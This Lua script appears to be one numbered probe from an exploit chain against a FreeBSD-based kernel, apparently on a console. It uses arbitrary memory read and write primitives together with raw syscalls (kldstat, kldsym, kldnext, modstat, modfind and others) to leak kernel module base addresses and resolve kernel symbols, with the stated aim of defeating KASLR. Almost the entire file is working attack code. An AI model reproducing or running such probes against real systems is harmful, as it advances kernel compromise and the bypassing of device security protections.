-- CRASH_CLASS: MODERATE
-- PROBE 56k4: kldstat/kldsym for direct KASLR defeat
--
-- Context: kldstat(2) = sys 308 was NEVER properly tested on 14.10.
-- 43a/43b logs are header-only (145/116 bytes), retest 53c got connection refused.
-- FreeBSD kldstat returns kld_file_stat with address/size of loaded modules.
-- If the kernel module (fileid=1) returns its base, KASLR is directly defeated.
--
-- Also test: kldsym (sys 337), kldfirstmod (sys 309), kldnext (sys 307)
--
-- Plan:
--   [A] Setup
--   [B] kldstat(2) with fileid=1 (kernel) — struct kld_file_stat
--   [C] kldnext (307) — enumerate module IDs
--   [D] kldsym (337) — resolve kernel symbol
--   [E] kldfind (306) — find module by name
--   [F] modstat (301) — module status

print("=== PROBE 56k4: KLDSTAT KASLR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

print("[A] Setup")
local sc_getpid = make_syscall(20)
local pid = to_num(sc_getpid())
print("  PID: " .. pid)

-- [B] kldstat — sys 308
-- FreeBSD: int kldstat(int fileid, struct kld_file_stat *stat)
-- struct kld_file_stat {
--   int version;       // +0x00, set to sizeof(struct kld_file_stat)
--   char name[MAXPATHLEN]; // +0x04, 1024 bytes
--   int refs;          // +0x404
--   int id;            // +0x408
--   struct kld_sym_lookup address; // +0x410 (8 bytes on amd64)
--   size_t size;       // +0x418
-- }
-- Total: ~0x420 bytes. version must be set to sizeof before call.
print("")
print("[B] kldstat (sys 308)")

local sc_kldstat = make_syscall(308)
local kstat_buf = memory.alloc(0x500)

-- Try fileid=1 (kernel itself), several struct sizes
local sizes = {0x420, 0x448, 0x460, 0x480, 0x500, 0x100, 0x58}
for _, sz in ipairs(sizes) do
    for i = 0, (sz/4) - 1 do safe_wd(kstat_buf + i*4, 0) end
    safe_wd(kstat_buf, sz)  -- version = sizeof

    local ok, ret = pcall(function()
        return sc_kldstat(uint64(1), uint64(kstat_buf))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  fileid=1 size=0x%X: ret=%d", sz, rv))

    if rv == 0 then
        -- Dump interesting fields
        local ver = safe_rd(kstat_buf) or 0
        print(string.format("    version: %d (0x%X)", ver, ver))

        -- Name at +4
        local name_bytes = {}
        for i = 0, 31 do
            local b = safe_rd(kstat_buf + 4 + i) or 0
            local c = b % 256
            if c == 0 then break end
            name_bytes[#name_bytes + 1] = string.char(c)
        end
        print("    name: " .. table.concat(name_bytes))

        -- refs at +0x404
        local refs = safe_rd(kstat_buf + 0x404) or 0
        print("    refs: " .. refs)

        -- id at +0x408
        local id = safe_rd(kstat_buf + 0x408) or 0
        print("    id: " .. id)

        -- address at +0x410 (8 bytes)
        local addr = safe_rq(kstat_buf + 0x410)
        print("    address: " .. hexval(addr))

        -- size at +0x418
        local size_lo = safe_rd(kstat_buf + 0x418) or 0
        local size_hi = safe_rd(kstat_buf + 0x41C) or 0
        print(string.format("    size: 0x%X%08X", size_hi, size_lo))

        -- Also dump raw hex at key offsets
        print("    raw +0x400..+0x440:")
        for off = 0x400, 0x440, 8 do
            local q = safe_rq(kstat_buf + off)
            print(string.format("      +0x%03X: %s", off, hexval(q)))
        end
        break
    end
end

-- Try fileid=0, 2, 3
for _, fid in ipairs({0, 2, 3}) do
    for i = 0, 0x10F do safe_wd(kstat_buf + i*4, 0) end
    safe_wd(kstat_buf, 0x420)
    local ok, ret = pcall(function()
        return sc_kldstat(uint64(fid), uint64(kstat_buf))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  fileid=%d size=0x420: ret=%d", fid, rv))
end

-- [C] kldnext — sys 307
-- int kldnext(int fileid) — returns next module ID, 0=first
print("")
print("[C] kldnext (sys 307)")
local sc_kldnext = make_syscall(307)
local cur_id = 0
for attempt = 1, 10 do
    local ok, ret = pcall(function()
        return sc_kldnext(uint64(cur_id))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  kldnext(%d) = %d", cur_id, rv))
    if rv <= 0 or rv == cur_id then break end
    cur_id = rv
end

-- [D] kldsym — sys 337
-- int kldsym(int fileid, int cmd, void *data)
-- cmd=1 = KLDSYM_LOOKUP
-- data = struct kld_sym_lookup { int version; char *symname; u_long symvalue; size_t symsize; }
print("")
print("[D] kldsym (sys 337)")
local sc_kldsym = make_syscall(337)
local sym_buf = memory.alloc(0x40)

-- Try to look up "printf" in kernel (fileid=0 = whole kernel)
local name_buf = memory.alloc(32)
-- Write "printf\0"
safe_wd(name_buf, 0x69727070)       -- "prip" (little endian: p=70 r=72 i=69 n=6E)
-- Actually let's be more careful
safe_wd(name_buf, 0x6E697270)       -- prin
safe_wd(name_buf + 4, 0x00006674)   -- tf\0

-- struct kld_sym_lookup at sym_buf:
-- +0x00: version (int, 4 bytes)
-- +0x08: symname (char*, 8 bytes on amd64)
-- +0x10: symvalue (u_long, 8 bytes)
-- +0x18: symsize (size_t, 8 bytes)
safe_wd(sym_buf, 0x20)              -- version = sizeof
safe_wq(sym_buf + 8, uint64(name_buf))
safe_wq(sym_buf + 0x10, uint64(0))
safe_wq(sym_buf + 0x18, uint64(0))

local ok, ret = pcall(function()
    return sc_kldsym(uint64(0), uint64(1), uint64(sym_buf))
end)
local rv = ok and to_num(ret) or -999
print(string.format("  kldsym(0, LOOKUP, 'printf'): ret=%d", rv))
if rv == 0 then
    local val = safe_rq(sym_buf + 0x10)
    local sz = safe_rq(sym_buf + 0x18)
    print("  symvalue: " .. hexval(val))
    print("  symsize: " .. hexval(sz))
end

-- [E] kldfind — sys 306
-- int kldfind(const char *file)
print("")
print("[E] kldfind (sys 306)")
local sc_kldfind = make_syscall(306)
-- "kernel\0"
safe_wd(name_buf, 0x6E72656B)  -- kern
safe_wd(name_buf + 4, 0x00006C65)  -- el\0
local ok2, ret2 = pcall(function()
    return sc_kldfind(uint64(name_buf))
end)
local rv2 = ok2 and to_num(ret2) or -999
print(string.format("  kldfind('kernel'): ret=%d", rv2))

-- [F] modstat — sys 301
-- int modstat(int modid, struct module_stat *stat)
print("")
print("[F] modstat (sys 301)")
local sc_modstat = make_syscall(301)
local mstat_buf = memory.alloc(0x200)
for mid = 1, 5 do
    for i = 0, 0x7F do safe_wd(mstat_buf + i*4, 0) end
    safe_wd(mstat_buf, 0x100)  -- version
    local ok3, ret3 = pcall(function()
        return sc_modstat(uint64(mid), uint64(mstat_buf))
    end)
    local rv3 = ok3 and to_num(ret3) or -999
    print(string.format("  modstat(%d): ret=%d", mid, rv3))
    if rv3 == 0 then
        local ver = safe_rd(mstat_buf) or 0
        print(string.format("    version: %d", ver))
        -- Dump first 64 bytes
        for off = 0, 56, 8 do
            local q = safe_rq(mstat_buf + off)
            print(string.format("    +0x%02X: %s", off, hexval(q)))
        end
    end
end

-- [G] modfind — sys 300
print("")
print("[G] modfind (sys 300)")
local sc_modfind = make_syscall(300)
safe_wd(name_buf, 0x6E72656B)  -- kern
safe_wd(name_buf + 4, 0x00006C65)  -- el\0
local ok4, ret4 = pcall(function()
    return sc_modfind(uint64(name_buf))
end)
local rv4 = ok4 and to_num(ret4) or -999
print(string.format("  modfind('kernel'): ret=%d", rv4))

-- Try "linker"
safe_wd(name_buf, 0x6B6E696C)  -- link
safe_wd(name_buf + 4, 0x00007265)  -- er\0
ok4, ret4 = pcall(function()
    return sc_modfind(uint64(name_buf))
end)
rv4 = ok4 and to_num(ret4) or -999
print(string.format("  modfind('linker'): ret=%d", rv4))

-- [H] modnext — sys 302
print("")
print("[H] modnext (sys 302)")
local sc_modnext = make_syscall(302)
local mod_id = 0
for attempt = 1, 10 do
    local ok5, ret5 = pcall(function()
        return sc_modnext(uint64(mod_id))
    end)
    local rv5 = ok5 and to_num(ret5) or -999
    print(string.format("  modnext(%d) = %d", mod_id, rv5))
    if rv5 <= 0 or rv5 == mod_id then break end
    mod_id = rv5
end

collectgarbage("restart")
print("")
print("=== PROBE 56k4 COMPLETE ===")
